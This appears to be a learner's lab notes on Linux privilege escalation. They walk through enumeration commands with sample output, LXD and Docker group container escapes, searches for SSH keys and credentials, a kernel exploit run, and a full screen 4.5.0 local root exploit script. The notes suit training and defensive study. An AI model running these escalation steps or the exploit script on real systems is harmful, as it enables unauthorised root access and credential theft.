To orient ourselves:
- whoami - what user are we running as
- id - what groups does our user belong to; each user in Linux systems is assigned to a specific group or groups and thus receives special privileges. The information about the available groups can be found in the /etc/group file, which shows us both the group name and the assigned user names.

```shell-session
cyberslut@htb[/htb]$ cat /etc/group

root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,cyberslut
tty:x:5:syslog
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:cyberslut
floppy:x:25:
tape:x:26:
sudo:x:27:mrb3n,cyberslut
audio:x:29:pulse
dip:x:30:cyberslut
www-data:x:33:
...SNIP...
```

The /etc/group file lists all of the groups on the system. We can then use the getent command to list members of any interesting groups.

```shell-session
cyberslut@htb[/htb]$ getent group sudo

sudo:x:27:mrb3n
```

If the user is a member of a privileged group, it can be used to escalate privileges. For example, if the user is a member of the LXC/LXD group (LXD is similar to Docker and is Ubuntu's container manager), it can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. First, we need to confirm if such group membership exists:

```shell-session
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

From here on, there are now several ways in which we can exploit `LXC`/`LXD`. We can either create our own container and transfer it to the target system or use an existing container. Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves.

```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

Such templates often do not have passwords, especially if they are uncomplicated test environments. These should be quickly accessible and uncomplicated to use. The focus on security would complicate the whole initiation, make it more difficult and thus slow it down considerably. If we are a little lucky and there is such a container on the system, it can be exploited. For this, we need to import this container as an image.

```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
```

After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

```shell-session
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.

```shell-session
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```

OR: 
Docker: if the user is placed in the docker group, it is essentially equivalent to root level access to the file system without requiring a password, as members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

```shell-session
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

OR:
Disk: users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the OS. An attacker with these privileges can use debugfs to access the entire file system with root level privileges. s with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

OR: 
adm:  members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

```shell-session
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

- hostname - what is the server named; can we gather anything from the naming convention
- ifconfig or ip -a - what subnet did we land in, does the host have additional NICs in other subnets?
- sudo -l - can our user run anything with sudo without needing a password? This can sometimes be the easiest win and we can do something like sudo su and drop right into a root shell
- sudo -V - check if the sudo version installed on the system is vulnerable to any legacy or recent exploits
- echo $PATH - check out our current user's PATH;  If the PATH variable for a target user is misconfigured we may be able to leverage it to escalate privileges -> check Privesc - Path Abuse for demo
- echo $HOME - check home directory 

```shell-session
cyberslut@htb[/htb]$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

- route or netstat -rn: check out the routing table; here we can see what other networks are available via which interface; netstat -lnp gives a listing of listening processes (switch the l option to a for all), which can reveal some interesting things listening on otherwise uninteresting ports or interfaces.


```shell-session
cyberslut@htb[/htb]$ route

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         _gateway        0.0.0.0         UG    0      0        0 ens192
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192
```

- arp -a - check the ARP cache too to see what other hosts the target has been communicating with.

```shell-session
cyberslut@htb[/htb]$ arp -a

_gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192
```

- env - check out all environment variables that are set for our current user, we may get lucky and find smth sensitive in there such as a password

```shell-session
cyberslut@htb[/htb]$ env

SHELL=/bin/bash
PWD=/home/cyberslut
LOGNAME=cyberslut
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/cyberslut
LANG=en_US.UTF-8

<SNIP>
```

- /etc/resolv.conf - in a domain environment, we'll definitely want to check this; if the host is configured to use internal DNS, we may be able to use this as a starting point to query the AD environment 
- ls -l /bin /usr/bin/ /usr/sbin/ - Binaries

```shell-session
cyberslut@htb[/htb]$ ls -l /bin /usr/bin/ /usr/sbin/

lrwxrwxrwx 1 root root     7 Oct 27 11:14 /bin -> usr/bin

/usr/bin/:
total 175160
-rwxr-xr-x 1 root root       31248 May 19  2020  aa-enabled
-rwxr-xr-x 1 root root       35344 May 19  2020  aa-exec
-rwxr-xr-x 1 root root       22912 Apr 14  2021  aconnect
-rwxr-xr-x 1 root root       19016 Nov 28  2019  acpi_listen
-rwxr-xr-x 1 root root        7415 Oct 26  2021  add-apt-repository
-rwxr-xr-x 1 root root       30952 Feb  7  2022  addpart
lrwxrwxrwx 1 root root          26 Oct 20  2021  addr2line -> x86_64-linux-gnu-addr2line
...SNIP...

/usr/sbin/:
total 32500
-rwxr-xr-x 1 root root      3068 Mai 19  2020 aa-remove-unknown
-rwxr-xr-x 1 root root      8839 Mai 19  2020 aa-status
-rwxr-xr-x 1 root root       139 Jun 18  2019 aa-teardown
-rwxr-xr-x 1 root root     14728 Feb 25  2020 accessdb
-rwxr-xr-x 1 root root     60432 Nov 28  2019 acpid
-rwxr-xr-x 1 root root      3075 Jul  4 18:20 addgnupghome
lrwxrwxrwx 1 root root         7 Okt 27 11:14 addgroup -> adduser
-rwxr-xr-x 1 root root       860 Dez  7  2019 add-shell
-rwxr-xr-x 1 root root     37785 Apr 16  2020 adduser
-rwxr-xr-x 1 root root     69000 Feb  7  2022 agetty
-rwxr-xr-x 1 root root      5576 Jul 31  2015 alsa
-rwxr-xr-x 1 root root      4136 Apr 14  2021 alsabat-test
-rwxr-xr-x 1 root root    118176 Apr 14  2021 alsactl
-rwxr-xr-x 1 root root     26489 Apr 14  2021 alsa-info
-rwxr-xr-x 1 root root     39088 Jul 16  2019 anacron
...SNIP...
```

[GTFObins](https://gtfobins.github.io) provides an excellent platform that includes a list of binaries that can potentially be exploited to escalate our privileges on the target system. With the next one-liner, we can compare the existing binaries with the ones from GTFObins to see which binaries we should investigate later.

```shell-session
cyberslut@htb[/htb]$ for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

Check GTFO for: ab                                         
Check GTFO for: apt                                        
Check GTFO for: ar                                         
Check GTFO for: as         
Check GTFO for: ash                                        
Check GTFO for: aspell                                     
Check GTFO for: at     
Check GTFO for: awk      
Check GTFO for: bash                                       
Check GTFO for: bridge
Check GTFO for: busybox
Check GTFO for: bzip2
Check GTFO for: cat
Check GTFO for: comm
Check GTFO for: cp
Check GTFO for: cpio
Check GTFO for: cupsfilter
Check GTFO for: curl
Check GTFO for: dash
Check GTFO for: date
Check GTFO for: dd
Check GTFO for: diff
```


- Optional: proc 

The [proc filesystem](https://man7.org/linux/man-pages/man5/proc.5.html) (`proc` / `procfs`) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information. It is the primary way to access process information and can be used to view and modify kernel settings. It is virtual and does not exist as a real filesystem but is dynamically generated by the kernel. It can be used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority, scheduling, and memory allocation.

```shell-session
cyberslut@htb[/htb]$ find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

...SNIP...
startups/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitdroot@10.129.14.200sshroot@10.129.14.200sshd:
cyberslut
[priv]sshd:
cyberslut
[priv]/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.ssh/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.sshsshd:
cyberslut@pts/2sshd:
```


To check:

- OS version: knowing the distro (Ubuntu, Debian, FreeBSD, SUSE, Red Hat, CentOS, Fedora, etc.) gives an idea of the types of tools that may be available; also identify the OS version, for which there may be public exploits available. For whatever version we encounter its important to see if we're dealing with something out-of-date or maintained. Ubuntu publishes its [release cycle](https://ubuntu.com/about/release-cycle) and from this we can see that in this example "Focal Fossa" does not reach end of life until April 2030.

```shell-session
cyberslut@htb[/htb]$ cat /etc/os-release

NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

- Kernel Version: public exploits targeting a vulnerability in the specific kernel version? Disclaimer: undesireable; kernel exploits can cause system instability or even complete crash; don't run against any production system (uname -a OR cat /proc/version)

```shell-session
cyberslut@htb[/htb]$ uname -a

Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```


```shell-session
cyberslut@htb[/htb]$ cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```

In this case, we can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A quick Google search for `linux 4.4.0-116-generic exploit` comes up with [this](https://vulners.com/zdt/1337DAY-ID-30003) exploit PoC. Next download, it to the system using `wget` or another file transfer method. We can compile the exploit code using [gcc](https://linux.die.net/man/1/gcc) and set the executable bit using `chmod +x`.

```shell-session
cyberslut@htb[/htb]$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

Next, we run the exploit and hopefully get dropped into a root shell.

```shell-session
cyberslut@htb[/htb]$ ./kernel_exploit 

task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
```

Finally, we can confirm root access to the box.

```shell-session
root@htb[/htb]# whoami

root
```

- Running services (e.g. Nagios, Exim, Samba, ProFTPd, etc), ESPECIALLY those running as root: check for public exploit PoCs

If we look at the process list, it can give us information about which scripts or binaries are in use and by which user. So, for example, if it is a script created by the administrator in his path and whose rights have not been restricted, we can run it without going into the `root` directory.

```shell-session
cyberslut@htb[/htb]$ ps aux | grep root

...SNIP...
root           1  2.0  0.2 168196 11364 ?        Ss   12:31   0:01 /sbin/init splash
root         378  0.5  0.4  62648 17212 ?        S<s  12:31   0:00 /lib/systemd/systemd-journald
root         409  0.8  0.1  25208  7832 ?        Ss   12:31   0:00 /lib/systemd/systemd-udevd
root         457  0.0  0.0 150668   284 ?        Ssl  12:31   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
root         752  0.0  0.2  58780 10608 ?        Ss   12:31   0:00 /usr/bin/VGAuthService
root         755  0.0  0.1 248088  7448 ?        Ssl  12:31   0:00 /usr/bin/vmtoolsd
root         772  0.0  0.2 250528  9388 ?        Ssl  12:31   0:00 /usr/lib/accountsservice/accounts-daemon
root         773  0.0  0.0   2548   768 ?        Ss   12:31   0:00 /usr/sbin/acpid
root         774  0.0  0.0  16720   708 ?        Ss   12:31   0:00 /usr/sbin/anacron -d -q -s
root         778  0.0  0.0  18052  2992 ?        Ss   12:31   0:00 /usr/sbin/cron -f
root         779  0.0  0.2  37204  8964 ?        Ss   12:31   0:00 /usr/sbin/cupsd -l
root         784  0.4  0.5 273512 21680 ?        Ssl  12:31   0:00 /usr/sbin/NetworkManager --no-daemon
root         790  0.0  0.0  81932  3648 ?        Ssl  12:31   0:00 /usr/sbin/irqbalance --foreground
root         792  0.1  0.5  48244 20540 ?        Ss   12:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         793  1.3  0.2 239180 11832 ?        Ssl  12:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         806  2.1  1.1 1096292 44976 ?       Ssl  12:31   0:01 /usr/lib/snapd/snapd
root         807  0.0  0.1 244352  6516 ?        Ssl  12:31   0:00 /usr/libexec/switcheroo-control
root         811  0.1  0.2  17412  8112 ?        Ss   12:31   0:00 /lib/systemd/systemd-logind
root         817  0.0  0.3 396156 14352 ?        Ssl  12:31   0:00 /usr/lib/udisks2/udisksd
root         818  0.0  0.1  13684  4876 ?        Ss   12:31   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root         871  0.1  0.3 319236 13828 ?        Ssl  12:31   0:00 /usr/sbin/ModemManager
root         875  0.0  0.3 178392 12748 ?        Ssl  12:31   0:00 /usr/sbin/cups-browsed
root         889  0.1  0.5 126676 22888 ?        Ssl  12:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         906  0.0  0.2 248244  8736 ?        Ssl  12:31   0:00 /usr/sbin/gdm3
root        1137  0.0  0.2 252436  9424 ?        Ssl  12:31   0:00 /usr/lib/upower/upowerd
root        1257  0.0  0.4 293736 16316 ?        Ssl  12:31   0:00 /usr/lib/packagekit/packagekitd
```

```shell-session
cyberslut@htb[/htb]$ ps au

USER       		PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      		1256  0.0  0.1  65832  3364 tty1     Ss   23:26   0:00 /bin/login --
cliff.moore     1322  0.0  0.1  22600  5160 tty1     S    23:26   0:00 -bash
shared     		1367  0.0  0.1  22568  5116 pts/0    Ss   23:27   0:00 -bash
root      		1384  0.0  0.1  52700  3812 tty1     S    23:29   0:00 sudo su
root      		1385  0.0  0.1  52284  3448 tty1     S    23:29   0:00 su
root      		1386  0.0  0.1  21224  3764 tty1     S+   23:29   0:00 bash
shared     		1397  0.0  0.1  37364  3428 pts/0    R+   23:30   0:00 ps au
```

- Installed Packages and Versions: check for any out-of-date or vulnerable packages. For example, the popular terminal multiplexer Screen suffers from a privesc vulnerability in Version 4.5.0 due to a lack of permission check when opening a log file. The screen version can be identified using the following command:

```shell-session
cyberslut@htb[/htb]$ screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```

This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access. The below script can be used to perform this privesc attack: 

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```


Create a List of Installed Packages

```shell-session
cyberslut@htb[/htb]$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

Listing...                                                 
accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1                                                          
accountsservice 0.6.55-0ubuntu12~20.04.5                   
acl 2.2.53-6                                               
acpi-support 0.143                                         
acpid 2.0.32-1ubuntu1                                      
adduser 3.118ubuntu2                                       
adwaita-icon-theme 3.36.1-2ubuntu0.20.04.2                 
alsa-base 1.0.25+dfsg-0ubuntu5                             
alsa-topology-conf 1.2.2-1                                                                                            
alsa-ucm-conf 1.2.2-1ubuntu0.13                            
alsa-utils 1.2.2-1ubuntu2.1                                                                                           
amd64-microcode 3.20191218.1ubuntu1
anacron 2.3-29
apg 2.2.3.dfsg.1-5
app-install-data-partner 19.04
apparmor 2.13.3-7ubuntu5.1
apport-gtk 2.20.11-0ubuntu27.24
apport-symptoms 0.23
apport 2.20.11-0ubuntu27.24
appstream 0.12.10-2
apt-config-icons-hidpi 0.12.10-2
apt-config-icons 0.12.10-2
apt-utils 2.0.9
...SNIP...
```


- Login shells: what login shells exist on the server (e.g. Tmux, Screen, etc.)

```shell-session
cyberslut@htb[/htb]$ cat /etc/shells

# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/usr/bin/screen
```


- Logged in users: there are a few ways to do this, such as the who command. The finger command will work to display this info on some Linux systems.

```shell-session
cyberslut@htb[/htb]$ w

 12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
cliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash
```

^ We can see that the `cliff.moore` user is logged in to the system with us.

- User Home Directories: check for ssh keys, scripts, configuration files

```shell-session
cyberslut@htb[/htb]$ ls /home

backupsvc  bob.jones  cliff.moore  logger  mrb3n  shared  stacey.jenkins
```

```shell-session
cyberslut@htb[/htb]$ ls -la /home/stacey.jenkins/

total 32
drwxr-xr-x 3 stacey.jenkins stacey.jenkins 4096 Aug 30 23:37 .
drwxr-xr-x 9 root           root           4096 Aug 30 23:33 ..
-rw------- 1 stacey.jenkins stacey.jenkins   41 Aug 30 23:35 .bash_history
-rw-r--r-- 1 stacey.jenkins stacey.jenkins  220 Sep  1  2015 .bash_logout
-rw-r--r-- 1 stacey.jenkins stacey.jenkins 3771 Sep  1  2015 .bashrc
-rw-r--r-- 1 stacey.jenkins stacey.jenkins   97 Aug 30 23:37 config.json
-rw-r--r-- 1 stacey.jenkins stacey.jenkins  655 May 16  2017 .profile
drwx------ 2 stacey.jenkins stacey.jenkins 4096 Aug 30 23:35 .ssh
```

- SSH keys: search around the system for accessible SSH private keys. We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may also sometimes find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys check the known_hosts file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.

```shell-session
cyberslut@htb[/htb]$ ls -l ~/.ssh

total 8
-rw------- 1 mrb3n mrb3n 1679 Aug 30 23:37 id_rsa
-rw-r--r-- 1 mrb3n mrb3n  393 Aug 30 23:37 id_rsa.pub
```

Identify any existing public or private keys and their permissions:

```
ls -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa
```

```
find / -name authorized_keys 2> /dev/null
```

```
find / -name id_rsa 2> /dev/null
```

- Bash history w/ the history command: check a user's bash history, as they may be passing passwords as an argument on the command line, working with git repositories, setting up cron jobs, and more. Reviewing what the user has been doing can give you considerable insight into the type of server you land on and give a hint as to privilege escalation paths. 

```shell-session
cyberslut@htb[/htb]$ history

    1  id
    2  cd /home/cliff.moore
    3  exit
    4  touch backup.sh
    5  tail /var/log/apache2/error.log
    6  ssh ec2-user@dmz02.inlanefreight.local
    7  history
```

Sometimes we can also find special history files created by scripts or programs. This can be found, among others, in scripts that monitor certain activities of users and check for suspicious activities.

```shell-session
cyberslut@htb[/htb]$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

-rw------- 1 cyberslut cyberslut 387 Nov 27 14:02 /home/cyberslut/.bash_history
```


- Sudo Privileges

```shell-session
cyberslut@htb[/htb]$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```


Try issuing a simple sudo su command; sometimes it can give you immediately a root session

- Configuration Files w/ extensions such as .conf, .config, mby also .cnf?: check for usernames, passwords, and other secrets; users can read almost all configuration files on a Linux operating system if the administrator has kept them the same; these configuration files can often reveal how the service is set up and configured to understand better how we can use it for our purposes. In addition, these files can contain sensitive information, such as keys and paths to files in folders that we cannot see. However, if the file has read permissions for everyone, we can still read the file even if we do not have permission to read the folder.

```shell-session
cyberslut@htb[/htb]$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

-rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf
-rw-r--r-- 1 root root 71 Nov 28 12:31 /run/NetworkManager/resolv.conf
-rw-r--r-- 1 root root 72 Nov 28 12:31 /run/NetworkManager/no-stub-resolv.conf
-rw-r--r-- 1 root root 0 Nov 28 12:37 /run/NetworkManager/conf.d/10-globally-managed-devices.conf
-rw-r--r-- 1 systemd-resolve systemd-resolve 736 Nov 28 12:31 /run/systemd/resolve/stub-resolv.conf
-rw-r--r-- 1 systemd-resolve systemd-resolve 607 Nov 28 12:31 /run/systemd/resolve/resolv.conf
...SNIP...
```

- Scripts: similar to conf files; sometimes, they have wrong privileges and through them, we can discover internal and individual processes

```shell-session
cyberslut@htb[/htb]$ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

/home/cyberslut/automation.sh
/etc/wpa_supplicant/action_wpa.sh
/etc/wpa_supplicant/ifupdown.sh
/etc/wpa_supplicant/functions.sh
/etc/init.d/keyboard-setup.sh
/etc/init.d/console-setup.sh
/etc/init.d/hwclock.sh
...SNIP...
```


- Readable Shadow Files: check for password hashes for users who have a password set 
- Password Hashes in /etc/password: unlikely; but still check; this configuration, while not common, can sometimes be seen on embedded devices and routers

```shell-session
cyberslut@htb[/htb]$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
<...SNIP...>
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mrb3n:x:1000:1000:mrb3n,,,:/home/mrb3n:/bin/bash
colord:x:111:118:colord colour management daemon,,,:/var/lib/colord:/bin/false
backupsvc:x:1001:1001::/home/backupsvc:
bob.jones:x:1002:1002::/home/bob.jones:
cliff.moore:x:1003:1003::/home/cliff.moore:
logger:x:1004:1004::/home/logger:
shared:x:1005:1005::/home/shared:
stacey.jenkins:x:1006:1006::/home/stacey.jenkins:
sysadm:$6$vdH7vuQIv6anIBWg$Ysk.UZzI7WxYUBYt8WRIWF0EzWlksOElDE0HLYinee38QI1A.0HW7WZCrUhZ9wwDz13bPpkTjNuRoUGYhwFE11:1007:1007::/home/sysadm:
```

```shell-session
cyberslut@htb[/htb]$ cat /etc/passwd | cut -f1 -d:

root
daemon
bin
sys

...SNIP...

mrb3n
lxd
bjones
administrator.ilfreight
backupsvc
cliff.moore
logger
shared
stacey.jenkins
cyberslut
```

To check which users have login shells!!!
Once we see what shells are on the system, we can check each version for vulnerabilities; bc outdated versions, such as Bash version 4.1., are vulnerable to shellshock)

```shell-session
cyberslut@htb[/htb]$ grep "*sh$" /etc/passwd

root:x:0:0:root:/root:/bin/bash
mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
bjones:x:1001:1001::/home/bjones:/bin/sh
administrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh
backupsvc:x:1003:1003::/home/backupsvc:/bin/sh
cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash
logger:x:1005:1005::/home/logger:/bin/sh
shared:x:1006:1006::/home/shared:/bin/sh
stacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash
cyberslut:x:1008:1008::/home/cyberslut:/bin/bash
```

- Cron Jobs: in conjunction with other misconfigurations such as relative paths or weak perms, cron jobs can be leveraged to escalate privileges when the scheduled cron job runs. Cron jobs are typically used for administrative tasks such as running backups, cleaning up directories, etc. For privesc using crontab check Privesc - Cron Job Abuse

```shell-session
cyberslut@htb[/htb]$ ls -la /etc/cron.daily/

total 60
drwxr-xr-x  2 root root 4096 Aug 30 23:49 .
drwxr-xr-x 93 root root 4096 Aug 30 23:47 ..
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 Sep 26  2017 apt-compat
-rwx--x--x  1 root root  379 Aug 30 23:49 backup
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common
```

